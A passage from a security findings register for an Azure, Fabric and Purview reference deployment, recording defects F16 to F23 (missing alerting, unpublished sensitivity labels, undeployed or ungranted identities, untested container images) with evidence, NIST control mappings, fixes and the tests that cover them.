holding real data should make that a deliberate addition of their own, not inherit it
from this reference template. `verification/layer-06-audit.ps1` gains a V6.5 criterion
(`Test-SqlBackupPosture`) asserting both values by ARM GET — `requestedBackupStorageRedundancy`
is a top-level database property, but `retentionDays` lives on the child
`backupShortTermRetentionPolicies/default` resource, reached via a plain `az resource
show` rather than the dedicated `az sql db str-policy show` command (which takes a
different, `--resource-group`/`--server`/`--database` argument shape than the resource-id
pattern every other V6.x criterion in this file already uses). V6.5 is NOT a master-plan
criterion, so it is documented in `docs/runbooks/layers/L06.md` § Validation cycle but
deliberately not added to the 43-row master-plan traceability table in
`docs/runbooks/layers/README.md`, which that file's own header states is scoped exactly
to master-plan criteria (same convention `L04.md` already uses for its own
non-master-plan supplementary check). TDD: 6 new/updated assertions in
`verification/tests/layer-06-audit.Tests.ps1` failed against the pre-fix script (V6.5
absent — `Should -Be $null` rather than `FAIL`/`PASS`, and the two existing criterion-count
assertions off by one), confirmed by running the test file before `Test-SqlBackupPosture`
existed; all pass after the fix. CP-9 closes outright — F16 was its sole contributor (see
`compliance/assessment/CP-9.json`).

---

## F17

**Zero alert rules or action groups anywhere in the estate**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** SI-4, IR-4 (NIST SP 800-53 Rev 5 — both tailored out of 800-171)
- **Closed by:** Task 19
- **Status:** CLOSED

**Verified:** grep for `metricAlerts|scheduledQueryRules|actionGroups|activityLogAlert`
across every `.bicep`, `.ps1` and `.yml`/`.yaml` file in the repo returns ZERO matches.
The only `az monitor` invocations anywhere are read-only queries the Verifier runs by
hand — `az monitor log-analytics query` (`verification/layer-06-audit.ps1:287`,
`verification/layer-07-audit.ps1:346`) and `az monitor activity-log list`
(`verification/layer-02-audit.ps1:158`, `verification/layer-09-audit.ps1:302`) — none of
which creates a standing alert.

**Distinct from F9:** F9 established that almost nothing is logged. This finding is that
even once F9's fix lands and Key Vault `AuditEvent`, SQL audit, storage logs and CAE
diagnostics all route to the Log Analytics workspace, nothing is subscribed to any of it.
No `Microsoft.Insights/metricAlerts` on SQL DTU, storage, or connection-failure metrics;
no `scheduledQueryRules` against the workspace (a spike in Key Vault `AuditEvent` denials,
repeated SQL auth failures, unexpected Container Apps restarts); no
`Microsoft.Insights/actionGroups` to receive any of it. `scripts/bootstrap/03-budget.ps1`
is the one place any notification exists in the whole system, and F15 already records
that those notifications are cost-only, email-only and actual-spend-only — this finding
is the general case: there is no alerting *capability* anywhere, security or operational.

**Impact:** the estate can detect nothing about itself. An operator learns of a
security-relevant event only by manually running a KQL query that nobody is scheduled to
run. This collapses the alerting half of SI-4 (system monitoring — alert on indicators of
compromise) and removes the only automated trigger IR-4's incident-handling capability
(detection is its first phase) would have to act on. F9's fix, on its own, buys
visibility only to someone who thinks to go looking; this is the gap that would actually
close the loop.

**Fix:** at minimum, a `Microsoft.Insights/actionGroups` resource (email or webhook) plus
a small set of `scheduledQueryRules`/`metricAlerts` against the signals F9 will start
collecting — Key Vault access-denied spikes, SQL failed-login spikes, Container Apps
environment health. Route the budget action group F15 adds to the same action group so
cost and security alerting share one page-out path.

**Closed (Task 19), with two corrections to this finding's own Fix text.** First:
F15/Task 17 never added an action group — it uses Cost Management's native
`contactEmails` notification receivers (`scripts/bootstrap/03-budget.ps1`), a different
subsystem (`Microsoft.Consumption/budgets`) from Azure Monitor's
`Microsoft.Insights/actionGroups`. There was no existing action group to route into.
Second: Container Apps environment health was dropped from the rule set, not
implemented — the individual container app resources a meaningful restart metric would
attach to do not exist at L6 (they deploy at L7, `apps/main.bicep`), so a `metricAlert`
cannot be authored in this template without an app resource id it never sees, and a
log-based proxy at the environment scope has no Microsoft-documented column/category
contract precise enough to write with confidence absent a live workspace to check it
against — exactly the condition this task's own brief named as a reason to stop and
verify rather than guess.

What landed instead, scoped deliberately to two rules rather than the brief's three:
`platform/main.bicep` adds one `Microsoft.Insights/actionGroups` (email receiver, the
same sponsor address `03-budget.ps1` already notifies) and two
`Microsoft.Insights/scheduledQueryRules`, both querying the `AzureDiagnostics` table
(the destination F9's diagnostic settings use by default — no
`logAnalyticsDestinationType` override exists anywhere in this template) in the Log
Analytics workspace F9 routes diagnostics to: a Key Vault `AuditEvent` denied-result
spike (`httpStatusCode_d >= 300`, the field Microsoft's own Key Vault logging guidance
and third-party samples both use for denied/failed requests — the vault holds the Direct
Line secret and `mcp-auth-token`) and an Azure SQL failed-login spike
(`SQLSecurityAuditEvents`, `succeeded_s == "false"`, a field confirmed against
independent published KQL examples against the Entra-only server F13's workload grants
authenticate through). Both rules are named verbatim by this finding's own Fix text
("Key Vault access-denied spikes, SQL failed-login spikes") and that is their
justification — **not** detection coverage of F1, F2 or F3, a claim an earlier pass of
this closure wrongly made and a review round caught. F1/F2/F3 are app-layer
authentication bypasses: an unauthenticated caller reaches the app, and the app's own
already-privileged managed identity then talks to Key Vault and SQL successfully, with
no access-denied event and no failed login anywhere in that path — the platform sees a
legitimate identity doing legitimate things, so neither rule would ever have fired for
that exploit class. What these two rules actually detect is narrower and different in
kind: probing or misconfiguration against Key Vault and Azure SQL directly (an
unexpected denial, an unexpected failed login), generalising F9's collection to the two
surfaces that hold the estate's real credentials and its Entra-only workload auth. A
third, cost/usage-spike rule — the fourth class this task's own scope-discipline
guidance named — was deliberately not duplicated either: Task 17/F15 already added
`Forecasted` budget notifications for exactly that gap, and a second, KQL-approximated
mechanism would be redundant against an existing, purpose-built one. Both rules
evaluate every 15 minutes; Azure's scheduled-query-rule cost boundary sits at 5
minutes — any interval at or above it is flat-priced, and only sub-5-minute
frequencies cost materially more (per published per-tier price lists) — so 15 minutes
sits inside that flat band rather than at some specially cheap point within it;
combined cost is on the order of a dollar or two per month, comfortably inside the
$200/30-day credit and the workspace's `dailyQuotaGb: '1'` ingestion cap.

On the routing correction: `scripts/bootstrap/03-budget.ps1` gains an optional
`-ActionGroupResourceId` parameter (empty by default) that adds the new action group to
every notification's `contactGroups` (Cost Management budgets support action groups
natively via this field, additive alongside `contactEmails`, never a replacement) —
empty by default because this script runs at G0, which precedes L6 on every
`infra-up.yml` pass, so the action group this parameter would reference does not exist
yet the first time a sponsor runs it. A documented, idempotent re-run with
`-ActionGroupResourceId` once L6 has deployed adds it as a supplementary contact,
achieving the "share one page-out path" goal without this template inventing a
same-pass ordering guarantee that does not hold. TDD: 7 new assertions in
`verification/tests/alerting.Tests.ps1` (new file, text-pattern regression guard on
`platform/main.bicep`, same shape as `diagnostics.Tests.ps1`) and 6 new assertions in
`scripts/bootstrap/tests/03-budget.Tests.ps1` all failed against the pre-fix files
(confirmed by running both suites before the corresponding implementation existed); all
pass after the fix. SI-4 and IR-4 both close outright — F17 was each control's sole
contributor (see `compliance/assessment/SI-4.json`, `compliance/assessment/IR-4.json`).

---

## F18

**Sensitivity labels published nowhere — a taxonomy, not a control**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** CM-6 (NIST SP 800-53 Rev 5 — tailored out of 800-171)
- **Closed by:** Task 20
- **Status:** CLOSED

**Where:** `infra/purview/labels.ps1` — `Initialize-SensitivityLabel` (`:85-116`) calls
only `New-Label` (`:111`, create path) and `Set-Label` (`:104`, drift-update path);
`Invoke-Main` (`:118-129`) loops the four-label taxonomy through it and returns. No
`New-LabelPolicy`, `Set-LabelPolicy`, or any publish/scope cmdlet appears anywhere in the
134-line file, or in its test file `infra/purview/tests/labels.Tests.ps1`.

**Documented as done, never implemented:** `docs/runbooks/layers/L04.md:53` lists
"publishes the label policy scoping the labels to the demo users' groups" as the second
of three things the L4 deploy step does. It does not — the script that bullet describes
performs only the first (`L04.md:51`, create-if-absent) and third (`:54`, record GUIDs)
of the three. `L04.md`'s next step also points at `infra/purview/auto-label-design.md`
for the (separately unimplemented) auto-labeling policy; that file does not exist in the
repo.

**Also unverified:** `verification/layer-04-audit.ps1`'s `Test-LabelTaxonomy` (V4.1,
`:65-95`) and `Test-LabelPersistence` (V4.2, `:97-120`) both call `Get-LabelSnapshot` →
`Get-Label` and compare label existence/GUIDs; grep for `LabelPolicy` in that file returns
zero matches. So even the Verifier's independent audit — which CLAUDE.md and the brief
hold up as the substitute for routine human review — reports L4 healthy while the labels
remain unpublished.

**Impact:** a Purview sensitivity label with no policy scoping it to any user, group, or
location does not appear in any Office/Purview client, cannot be applied to a document or
email, and triggers no downstream protection action. The four labels exist as directory
objects with GUIDs the L4 audit can enumerate, and nothing else. A label that is never
published to a user enforces nothing — it is a taxonomy, not a control. For a reference
implementation this is the same shape of gap as F2 (a control that reads as present in
design and is absent in the shipped artifact) and F13 (grants documented in prose,
implemented nowhere), here in the data-governance layer instead of the auth layer.

**Fix:** add a `New-LabelPolicy`/`Set-LabelPolicy` step to `labels.ps1` publishing the
four labels to the demo user/group scope `L04.md` already names; extend
`verification/layer-04-audit.ps1` with a V4.3 criterion asserting the policy exists and is
scoped as expected; author `infra/purview/auto-label-design.md` or drop the `L04.md`
reference to it.

**Closed (Task 20):** the controller's ruling on this task found the brief under-scoped
it — a third defect of the identical shape (`L04.md` asserting behaviour `labels.ps1`
never implemented) sat one section below the one the brief named. `L04.md:57-60` claimed
the `mls-operations` auto-label policy was "applied by the same script where the AIP-P2
entitlement is present (checked at runtime)"; `labels.ps1` had no auto-label function and
no entitlement check anywhere. All three defects are closed together, since fixing the
brief's two while leaving the third standing would have reproduced F18's own shape inside
the file F18 exists to fix. **(1) Policy publish:** `labels.ps1` gains
`Get-LabelPolicyScope` (the four demo groups `infra/entra/manifest.json` names —
`mls-flight-operations`, `mls-security-team`, `mls-finance`, `mls-executives`) and
`Initialize-LabelPolicy`, wired into `Invoke-Main` — create-if-absent via
`New-LabelPolicy`, update-in-place on label-list or scope drift via `Set-LabelPolicy`'s
`Add`/`RemoveLabel` and `Add`/`RemoveExchangeLocation` parameters, same shape as
`Initialize-SensitivityLabel`, gated by `-WhatIf` the same way. **(2)
`auto-label-design.md`:** authored, design-only, recording what a real Fabric-native
implementation would need and why this one doesn't attempt it (see (3)). **(3) The
auto-label claim:** corrected in `L04.md` rather than implemented — the claim was wrong
independent of licensing. `labels.ps1`'s only authenticated surface is a Security &
Compliance PowerShell session; the cmdlets that actually apply auto-labeling
(`New-AutoSensitivityLabelPolicy`/`Set-AutoSensitivityLabelPolicy`) scope only to
Exchange/SharePoint/OneDrive/Teams locations, none of which is a Fabric workspace, so
even a perfect AIP-P2 entitlement check would have nothing to gate: there is no "same
script" apply path to build. Implementing a fake runtime check against a mechanism that
doesn't reach Fabric would have been a second, self-inflicted instance of the same
defect this finding closes, so `L04.md`'s Deploy procedure step 2 and Failure mode 4 now
say this plainly instead. `verification/layer-04-audit.ps1` gains a **V4.3** criterion
(`Test-LabelPolicyScope`, read-only — `Get-LabelPolicy`, the `mls-verifier` View-Only
Configuration role's `Get-Label` counterpart) asserting the policy exists with exactly
the four labels and exactly the four demo groups; it is supplementary, not a
master-plan criterion, documented in `L04.md`'s Validation cycle but deliberately not
added to `docs/runbooks/layers/README.md`'s 43-row traceability table or
`.github/README.md`'s per-script summary (same convention CP-9's V6.5 already uses).
TDD: 9 new/updated assertions in `infra/purview/tests/labels.Tests.ps1` and 5 in
`verification/tests/layer-04-audit.Tests.ps1` — policy publish, idempotent replay,
label-drift and scope-drift update-in-place in both add/remove directions, `-WhatIf`
making no mutating policy calls, V4.3 PASS/FAIL on missing policy / missing group /
extra group / missing label, and V4.1 staying independent of a V4.3 failure — all
failed against the pre-fix files (mutation-checked: reverted, confirmed RED, restored);
all pass after the fix. CM-6 closes outright — F18 was its sole contributor (see
`compliance/assessment/CM-6.json`).

---

## F19

**cost-ingest documented as deployed; deploys nowhere**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** none — no 800-171 control (availability/completeness)
- **Closed by:** not assigned
- **Status:** GAP

**Where:** `.github/workflows/infra-up.yml:31` — "WHERE THE FINOPS LEG LIVES. `apps/cost-ingest` (Cost Management daily export → storage → consumption Function → lakehouse `cost_daily`) is an L6 resource and deploys inside layer-06-platform.yml alongside the export wiring it consumes." `apps/cost-ingest/README.md:143`'s RBAC table says the identity's grants are "granted by L6's Bicep".

**Verified absent, not merely undocumented:** `grep -rn cost-ingest infra/` returns zero matches — no Bicep resource of any kind. `grep -n "cost-ingest|functionapp|Microsoft.Web" .github/workflows/layer-06-platform.yml` also returns zero matches — the workflow that is supposed to deploy it creates an Azure SQL schema, loads ten tables, and wires the Cost Management export definition, and nothing else. There is no Function App, and therefore no identity, for cost-ingest anywhere in this repo's infrastructure.

**Found while:** implementing Task 12 (F13) — `cost-ingest -> Storage Blob Data Reader` is one of F13's seven documented workload grants. There is no principalId to grant that role to, because the principal does not exist.

**Impact:** cost-ingest is not on the critical demo path and nothing silently mis-secures as a result of this gap on its own — it simply will not exist when `apps/cost-ingest` or `infra-up.yml`'s own commentary says it will. A sponsor or adopter who reads `infra-up.yml:31` or the README's RBAC table and concludes the FinOps leg is live would be wrong; the daily Cost Management export (once Task 17/F15 lands) would write to storage with nothing downstream ever reading it into the lakehouse.

**Fix:** either provision `apps/cost-ingest` as a real Azure Function App with its own user-assigned identity (new deploy surface, new spend decision against the sponsor's 30-day credit — a G2-shaped decision, not a remediation-task one), or correct `infra-up.yml:31` and the README's RBAC table to state plainly that the Function does not deploy yet. Do not build the Function App as part of closing F13 or F19 without that decision being made explicitly.

---

## F20

**data-api's contained-user grant is expressed but never applies**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** none — no 800-171 control (availability)
- **Closed by:** Task 22
- **Status:** CLOSED

**Where:** `data/seed/sql/sql-seed.psm1`'s `Install-SeedSchema` (`Get-ChildItem -Filter *.sql | Sort-Object Name`, applied unconditionally, no error tolerance — `Invoke-SeedSqlCommand` uses `ErrorAction Stop`); `.github/workflows/layer-06-platform.yml`'s single `data/seed/seed.ps1 -Target sql` invocation; `.github/workflows/layer-07-apps.yml`, which (before Task 22) never invoked it a second time.

**The mechanism:** `data/seed/sql/900-contained-users.sql` (Task 12, F13) expresses `CREATE USER [mls-data-api-demo-id] FROM EXTERNAL PROVIDER;` — correct code, and it is genuinely idempotent once it succeeds. But `seed.ps1 -Target sql` ran exactly once, inside L6, which completes before L7 creates the data-api user-assigned identity. On that first pass the statement cannot resolve the AAD principal and is guarded to fail loudly rather than abort the rest of the DDL (`BEGIN TRY/CATCH` with a severity-10, non-terminating `RAISERROR` — see that file's header). The guard protects L6's existing, working SQL seed from a regression; by itself it does not make the grant apply. Before Task 22, nothing re-ran the seed script after L7, so in a single `infra-up.yml` pass the grant never landed in a live tenant.

**Distinct from F13, deliberately not folded into it:** F13 is "zero workload RBAC expressed in IaC" — the `.sql` file genuinely is that expression, so F13's remedy is satisfied for this one grant. The defect here is different in kind: the code that would make the grant real is never invoked at the right time. Folding this into F13's rationale would make it close silently the moment F13's other two grants land (Task 17, F19), and the sequencing bug would vanish with it.

**Impact (before Task 22):** `data-api` 403s against Azure SQL until someone manually re-runs `data/seed/seed.ps1 -Target sql` after L7 — the same "dated failure" shape F13 itself describes (days 7-14 of the sponsor's 30-day clock, once G0 item C9 sets `fabricSqlEndpoint`), just one layer further down: the code now exists, but nothing calls it a second time.

**Fix (as originally proposed):** add a step to `.github/workflows/layer-07-apps.yml`, after the data-api identity is created, that re-invokes `data/seed/seed.ps1 -Target sql` (idempotent — the other nine tables and the `schema_version` stamps are all no-ops on a second run) so the grant actually lands in a standard `infra-up.yml` pass.

**Closed (Task 22) — and the trap the obvious fix walks into:** a plain second `seed.ps1 -Target sql` does reach `Install-SeedSchema` — that function already applies every `data/seed/sql/*.sql` file unconditionally, before the row-count check, so the load short-circuit alone was never actually the blocker (proved by `data/seed/tests/sql-seed.Tests.ps1`'s pre-existing `'still applies the DDL, because that is guarded and free'` test). The real blocker is upstream: `Assert-SqlSeedPrerequisite` requires `data/generated/` to be complete, and `seed.ps1`'s step 1 tries to build it with `python -m generators build` when it isn't — and the L7 apps-deploy job has no Python toolchain and a freshly checked-out, gitignored (so absent) `data/generated/`. A literal re-invocation therefore throws before `Install-SeedSchema` ever runs, for a DDL-only statement that never needed a dataset in the first place.

Fixed with a dedicated invocation mode rather than `-Force` (which the controller ruled out: `-Force` means wipe-and-reload, turning one idempotent grant into a full reseed of ten operational tables against Azure SQL serverless — paying auto-resume and minutes of runtime for no reason). `data/seed/seed.ps1` and `data/seed/sql/sql-seed.psm1`'s `Invoke-SqlSeed`/`Assert-SqlSeedPrerequisite` gained a `-SchemaOnly` switch (`-Target sql` only): it skips dataset generation entirely, skips the `data/generated/` completeness check, applies the DDL via `Install-SeedSchema`, and returns — no row-count probe, no wipe, no load. `.github/workflows/layer-07-apps.yml`'s `deploy` job now resolves the Azure SQL server/database directly from Azure (`az sql server list` / `az sql db list` against the platform resource group, under the same `mls-github-deployer` credential L6 already uses to run this DDL) and calls `./data/seed/seed.ps1 -Target sql -SchemaOnly ...` right after "Deploy the apps" — warning and skipping, rather than failing the job, when no server is found yet (a standalone L7 dispatch ahead of L6). Placed in the layer workflow rather than `infra-up.yml` so a standalone `layer-07-apps.yml` dispatch lands the grant too, and `infra-up.yml` inherits it by calling that workflow.

Covered by `data/seed/tests/sql-seed.Tests.ps1`'s `-SchemaOnly` context: `Install-SeedSchema` fires and `AppliedDdl` carries the grant file even when `Get-SeedTableRowCount` is mocked to throw if called at all (proving the path never depends on — and never gates on — row counts, which is the second-run scenario this finding is about), `Clear-SeedTable`/`Import-SeedTable` are never invoked, and `Assert-SqlSeedPrerequisite` is called with `-SchemaOnly` so its dataset check is provably bypassed rather than merely satisfied by a fixture. `data/seed/tests/seed.Tests.ps1` covers the orchestration layer: `-SchemaOnly` skips dataset generation even when the dataset is reported incomplete, forwards `-SchemaOnly` to `Invoke-SqlSeed`, and is rejected outright with `-Target lakehouse` or `-Target both` (it has no lakehouse equivalent). Not claimed: this has never run against a live tenant — no Azure/SQL connection was made to build or test it, per this branch's constraints — so the `az sql server/db` resolution and the live `Install-SeedSchema` DDL application are verified by code reading and mocked-transport/mocked-`Invoke-Sqlcmd` tests only, not by an end-to-end run.

---

## F21

**mls-verifier's documented Fabric workspace Viewer grant does not exist**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** none — no 800-171 control (availability — breaks the Verifier's sign-off gate CLAUDE.md treats as authoritative)
- **Closed by:** Task 21
- **Status:** CLOSED

**Where:** `infra/fabric/provision-workspace.ps1` (before this task's correction) asserted at lines 19-22: "at L5 the `mls-verifier` service principal is granted the workspace VIEWER role on `mls-operations`... That grant happens in the L5 deploy path, not in this script." `verification/layer-05-audit.ps1:57` builds its Fabric bearer header on that same assumption ("workspace Viewer, granted"). `.github/workflows/layer-05-fabric.yml`'s step named "Azure login (OIDC, mls-verifier — Reader + workspace Viewer)" only logs in — it grants nothing.

**Verified absent, not merely undocumented:** before Task 12 added `Add-FabricWorkspaceRoleAssignment`/`Get-FabricWorkspaceRoleAssignment`, `infra/fabric/fabric-api.psm1` had no role-assignment function at all (every function in the file, lines 27-468, grepped for `roleAssignment|Viewer|grant` — zero hits). `grep -n "Viewer|roleAssignment|grant" .github/workflows/layer-05-fabric.yml -i` returns only the job-step label quoted above, which calls nothing.

**Found while:** implementing Task 12 (F13) — the instruction to "use the existing REST path in infra/fabric/fabric-api.psm1 rather than inventing a new one" for data-api's Fabric Viewer grant assumed a role-assignment wrapper already existed. It did not; one was added for data-api's (different) grant, which is how this gap surfaced.

**Impact:** if `mls-verifier` genuinely has no Fabric workspace role, the entire L5 Verifier audit 403s in live operation, independent of F13. CLAUDE.md's core control is "a layer is DONE only on the Verifier's sign-off, running as mls-verifier (Reader), never as the deployer SP" — a Verifier that cannot authenticate to the Fabric REST API cannot produce that sign-off for L5 at all. Same class as F6 (verifier had no federated credential): a control whose absence is invisible until the moment the estate depends on it.

**Fix:** grant `mls-verifier`'s principal the Fabric workspace Viewer role using the same `Add-FabricWorkspaceRoleAssignment` function Task 12 added for data-api (a different call, a different principal, a different finding) — from the L5 deploy path (`layer-05-fabric.yml`), matching what the corrected docstring now says is NOT yet true rather than what the original docstring falsely claimed was already true.

**Closed (Task 21):** `infra/fabric/provision-workspace.ps1` gained a `-VerifierPrincipalId` parameter, empty by default (no-op, same shape as `-DataApiPrincipalId`), which grants exactly workspace **Viewer** — never broader — via the existing `Add-FabricWorkspaceRoleAssignment`/`Get-FabricWorkspaceRoleAssignment` pair, checking for an existing `Viewer` assignment first so a replay is a no-op. `.github/workflows/layer-05-fabric.yml`'s `deploy` job (authenticated as `mls-github-deployer`, which becomes the workspace's Admin on creation and so can grant roles in it) now resolves `mls-verifier`'s service-principal **object ID** — Fabric role assignments need the object ID, not the application/client ID, and only `AZURE_VERIFIER_CLIENT_ID` (the client ID) is configured anywhere in this estate — via `az ad sp show --id $AZURE_VERIFIER_CLIENT_ID` (the deployer already holds Graph `Directory.Read.All`), and passes the result to `-VerifierPrincipalId`. The step is skipped, not failed, when `AZURE_VERIFIER_CLIENT_ID` is unset (same "unverified rather than broken" shape the rest of this layer already uses); it hard-fails the run if the lookup resolves to nothing, rather than silently granting nobody. `verification/layer-05-audit.ps1:57`'s Fabric bearer-header assumption now holds. Covered by `infra/fabric/tests/provision-workspace.Tests.ps1`'s new `'mls-verifier workspace Viewer grant (F21)'` context (mocked Fabric API, zero cloud calls): the grant fires exactly once with `Role -eq 'Viewer'` when a principal ID is supplied and none exists yet, is skipped when an existing `Viewer` assignment is found (idempotent replay), never fires with a role other than `Viewer`, stays a no-op when the parameter is omitted, and composes correctly alongside the pre-existing data-api grant in the same run. Not claimed: this has never been exercised against a live tenant — no Azure/Fabric connection was made to build or test it, per this branch's constraints — so the `az ad sp show` resolution and the live Fabric `roleAssignments` call are verified by code reading and mocked-transport tests only, not by an end-to-end run.

---

## F22

**Container images never smoke-tested in CI**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** none — no 800-171 control (availability)
- **Closed by:** Task 24
- **Status:** CLOSED

**Where:** `.github/workflows/app-{control-tower,launch-ops,data-api,mcp-tools}-ci.yml`'s `image` job. Each builds the container (`docker/build-push-action`, `load: true`), Trivy-scans it (`severity: CRITICAL`, `exit-code: '1'`), optionally uploads a SARIF, logs in to GHCR and pushes — and, before this task, never ran `docker run` anywhere in that sequence. The only place the image's entrypoint was ever actually executed was `verification/layer-07-audit.ps1`, which runs post-deployment against a live tenant, long after the image has already been pushed and a revision rolled onto the container app.

**Verified absent, not merely undocumented:** `grep -n "docker run" .github/workflows/app-*-ci.yml` returned zero matches across all four workflows before this task. Each `image` job's own step list — checkout, compute the GHCR reference, buildx setup, build, Trivy gate, Trivy SARIF, SARIF upload, GHCR login, push — has no step between "build" and "push" that starts the container, confirmed by reading all four files end to end.

**Found while:** implementing Task 14 (F11, the frontends' CSP/nonce hardening), which in the same pass also moved both frontend images to run as `USER nginx` (a defense-in-depth fix that was never part of F11 itself, folded in because it touched the same Dockerfiles). The Task 14 reviewer flagged, as an "Important" finding, that this new hardening had no way to prove itself: `/etc/nginx/conf.d` not staying writable by `nginx` makes the base image's entrypoint skip its `envsubst` templating pass silently (`20-envsubst-on-templates.sh` checks `[ -w "$output_dir" ]` and no-ops rather than erroring) and fall back to nginx's own stock "Welcome to nginx!" config — which still answers HTTP 200 on `/`. A CI pipeline that never starts the container cannot catch that regression, or any other "the image builds and scans clean but the entrypoint serves the wrong thing" failure mode, before it reaches a live container app.

**Impact:** the gap was not specific to the `USER nginx` change — it is general: nothing between `docker build` and the image reaching the registry (and from there, a container app revision) ever executes the entrypoint. A broken `CMD`, a missing runtime dependency pruned by `npm prune --omit=dev` too aggressively, a `USER` with no permission to bind the listening port, or exactly the silent-stock-page failure mode above would all pass Trivy (they are not vulnerabilities) and pass the Node/TypeScript unit suites (which never import the built image) and only surface once `verification/layer-07-audit.ps1` runs against the live tenant — by which point the broken image has already been pushed to GHCR and rolled onto a container app. Same class as F5 (a CI gap meaning something is never actually exercised), not a document-vs-code mismatch like most of F14–F21.

**Fix:** add a step to each `image` job, after the image exists and the Trivy CRITICAL gate has already passed (so a vulnerable image is never started) and before any registry credential enters the job (`docker/login-action`), that runs the built image detached, polls `GET /healthz` with a bounded timeout, asserts the response is the app's own payload rather than merely a 200 (see the mechanism note below for which half of that actually catches the F14 case), dumps `docker logs` on any failure, always stops and removes the container, and fails the build (no `continue-on-error`) on a bad payload.

**Closed (Task 24):** all four `image` jobs gained a step named `Smoke-test the image — boot it and check its own /healthz (F22)`, placed immediately after `Upload the Trivy SARIF` and immediately before `Log in to GHCR`. The brief's two placement constraints conflict for this job by construction — "keep it in the job that already holds the image" and "do not put it in a job holding `id-token: write` or `packages: write`" — because the `image` job that holds the built image is the same job that pushes it and therefore holds `packages: write` (and `security-events: write`) in every one of these four workflows; there is no job satisfying both. The placement chosen honours the constraint that actually protects something: the step runs after the CRITICAL gate (a vulnerable image is never started) and before `docker/login-action` (no registry credential has entered the job's environment when the container is running).

Each step: `docker run -d` on a loopback-only published port (`-p 127.0.0.1::8080`, host port chosen by Docker and resolved via `docker port`, not a fixed port — avoids any collision on the runner); polls `GET /healthz` in a 30×2s-bounded loop via `curl -s --max-time 3 -w '\n%{http_code}'` (never a single sleep-then-curl); asserts HTTP 200 *and* an app-specific discriminator (not a bare 200, which the stock nginx page also satisfies); dumps `docker logs` on every failure path before `exit 1`; always stops and removes the container via `trap cleanup EXIT`, so cleanup runs on success, on an assertion failure, and on any unexpected early exit under `set -euo pipefail`; carries no `continue-on-error` (unlike the F20 grant step in `layer-07-apps.yml`, which is deliberately advisory because it is remediation, not verification — this is a merge gate). The container is handed no secret: no `secrets.*`, no `GITHUB_TOKEN`, no `--env-file`, no volume mount of the workspace.

The discriminator differs per app, each verified by reading the actual route handler rather than assumed: control-tower and launch-ops (`nginx.conf.template`'s `location = /healthz`) answer `text/plain` `"ok ${MLS_IMAGE_DIGEST}\n"`, whose Dockerfile `ENV MLS_IMAGE_DIGEST=unset` default makes the expected body `ok unset` — so the check asserts HTTP 200 **and** a body matching `^ok `.

**Which mechanism actually catches the F14 regression (corrected by the Task 24 review).** An earlier draft of this entry claimed the untemplated container would answer `/healthz` with a 404. That is not what happens on the wire, and the distinction is worth stating precisely because a register that describes the wrong mechanism is the same defect class as F2, F17, F18 and F23. `apps/control-tower/Dockerfile:55-56` records the real fallback: skipped templating leaves nginx serving its stock `Welcome to nginx!` config **on port 80**, while this app's template is the only thing that ever says `listen 8080;`. The smoke step publishes and curls **8080 only**. So an untemplated image accepts no connection at all on the polled port, and the gate fails through the poll's bounded-timeout branch ("never accepted a connection"), not through a 404 on `/healthz`.
The `^ok ` discriminator is therefore not the mechanism that catches *this* regression — it is an independent second guard covering every other "something answers 8080 but it is not this app" case, which a bare 200 check would pass. Both are wanted; only the timeout branch is load-bearing for F14. data-api (`src/app.ts`'s `/healthz` handler) answers JSON with `service: "data-api"`; the check asserts `.service == "data-api"`. mcp-tools (`src/app.ts`'s `/healthz` handler) answers JSON with **no** `service` field — asserting one there would be a false discriminator that happens to never fire — so the check asserts `.ok == true and .transport == "streamable-http"` instead.

mcp-tools also needed a boot-time accommodation unrelated to F22 itself: `apps/mcp-tools/src/auth-gate.ts`'s `loadInboundAuth` (F2's fix, Tasks 4–5) throws at startup in every mode unless `MCP_AUTH_TOKEN` or `MCP_ALLOW_UNAUTHENTICATED` is set, because the container app's ingress is external regardless of backend mode. A bare `docker run` of that image exits immediately and would look like an image defect rather than a missing setting. The smoke step passes `-e MCP_ALLOW_UNAUTHENTICATED=true` — a boolean opt-out, not a token, authenticating nothing, and `/healthz` is unauthenticated at the ingress regardless since the gate is scoped to the `/mcp` route only. The other three images needed no environment at all to boot: control-tower and launch-ops default `DATA_API_ORIGIN` and `MLS_IMAGE_DIGEST` in their Dockerfiles, and data-api defaults `MLS_DATA_BACKENDS` to `local` (`src/config.ts`) with `LocalTablesBackend` reading `data/generated/*.json` lazily per request rather than at boot, so `/healthz` answers before any table route would ever be called.

Covered by `verification/tests/app-ci-smoke-test.Tests.ps1` — a workflow-shape assertion (GitHub Actions `run:` steps have no unit-test harness, same approach as `no-secret-outputs.Tests.ps1` and `self-heal-selection.Tests.ps1`), since the runtime behaviour itself cannot execute without a Docker daemon, unavailable on this dev host. Placement is asserted by **line-number comparison** (the smoke step's line strictly between the Trivy gate's and `Log in to GHCR`'s, and strictly before the push step's), not mere substring presence, across all four workflows; per-app discriminator payloads, the bounded retry loop, the `docker logs`-before-every-`exit 1` invariant, the EXIT-trap cleanup, the absence of `continue-on-error`, and the absence of any credential/mount in the step are each asserted directly against the extracted step body. Five behaviours were mutation-tested one at a time against the real workflow files (placement after `Log in to GHCR`, the F14 discriminator regex, the EXIT-trap cleanup, an added `continue-on-error: true`, and the mcp-tools auth opt-out) — each neutering flipped exactly the expected assertion(s) red and nothing else, confirmed by re-running the suite and then restoring the file to its pre-mutation content before the real commit. Not claimed: this has never been exercised against a live Docker daemon or a live tenant — no container was actually started to build or verify this fix, per this branch's constraints — so the smoke step's own correctness rests on code reading, the step order other app-*-ci.yml jobs already establish, and the route handlers' source, not an end-to-end CI run.

---

## F23

**Three G3 full-tenant teardown scripts the runbooks instruct operators to run did not exist**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** CM-6 (NIST SP 800-53 Rev 5 — tailored out of 800-171, the same control F18 maps to)
- **Closed by:** Task 25
- **Status:** CLOSED

**Where:** `docs/runbooks/kill-rebuild.md` § 7 is a NUMBERED OPERATOR PROCEDURE for G3
full-tenant teardown / handback. Steps 1, 2 and 4 instructed a human to run
`infra/purview/teardown.ps1`, `infra/entra/teardown.ps1` and
`infra/policy/teardown.ps1`, in that order. `docs/runbooks/layers/L02.md:129`,
`L03.md:184` and `L04.md:148` each carried the matching per-layer Teardown-section
